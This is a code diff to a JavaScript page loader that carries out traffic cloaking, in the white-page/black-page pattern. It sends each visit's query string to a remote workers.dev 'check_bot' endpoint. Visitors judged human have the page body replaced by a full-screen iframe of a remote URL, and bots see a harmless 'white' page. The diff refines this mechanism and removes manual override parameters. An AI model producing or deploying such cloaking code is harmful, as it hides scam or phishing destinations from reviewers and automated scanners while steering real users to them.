@@ -1,7 +1,7 @@
 const createLoader = () => {
   const frame = document.createElement('iframe');
   frame.id = 'load_frame';
-  frame.src = `frameLoad.html`;
+  frame.src = 'projects/helloworld/frameloader.html';
   frame.frameBorder = 0;
   frame.width = '100%';
   frame.height = '100%';
@@ -13,24 +13,18 @@ const createLoader = () => {
   frame.style.zIndex = 9999;
 
   const body = document.querySelector('body');
-  if (body) {
-    body.prepend(frame);
-  }
+  if (body) body.prepend(frame);
 };
 
 const showWhite = () => {
-  const body = document.body;
+  const body = document.querySelector('body');
   const html = document.documentElement;
-
   if (body) {
     body.classList.remove('hidden');
     body.removeAttribute('hidden');
     body.style.overflow = 'auto';
   }
-  if (html) {
-    html.style.overflow = 'auto';
-  }
-
+  if (html) html.style.overflow = 'auto';
 
   document.querySelectorAll('style').forEach(styleTag => {
     if (styleTag.textContent && styleTag.textContent.includes('overflow: hidden')) {
@@ -42,14 +36,8 @@ const showWhite = () => {
   if (preload) preload.remove();
 };
 
-
 const showBlack = (blackUrl) => {
-  const body = document.body;
-
-
-  body.classList.remove('hidden');
-  body.removeAttribute('hidden');
-
+  const body = document.body; 
 
   body.innerHTML = '';
   body.style.margin = '0';
@@ -71,6 +59,19 @@ const showBlack = (blackUrl) => {
   `;
   body.appendChild(frame);
 
+  body.classList.remove('hidden');
+  body.removeAttribute('hidden');
+
+  const style = document.createElement('style');
+  style.innerHTML = `
+    @media only screen and (max-width: 768px) {
+      #wrapper_frame { height: 50vh; }
+    }
+    @media only screen and (max-width: 480px) {
+      #wrapper_frame { height: 30vh; }
+    }
+  `;
+  document.head.appendChild(style);
 
   setTimeout(() => {
     const preload = document.querySelector('#load_frame');
@@ -78,30 +79,19 @@ const showBlack = (blackUrl) => {
   }, 300);
 };
 
-
-
 createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
 
-  const qs = new URLSearchParams(location.search);
-  if (qs.has('white')) { console.log('force white'); showWhite(); return; }
-  if (qs.has('black')) { 
-    const u = qs.get('black') || '';
-    console.log('force black', u);
-    if (u) { showBlack(u); return; }
-  }
-
-  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
+  const qs = location.search || '';
+  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot' + qs)
     .then(res => res.json())
     .then(res => {
       console.log('check_bot response:', res);
-   
       if (res?.code === 200 && res.result === false && res.url) {
         showBlack(res.url + '/wvS95k'); 
       } else {
-
-        setTimeout(showWhite, 100);
+        setTimeout(showWhite, 200);     
       }
     })
     .catch(err => {
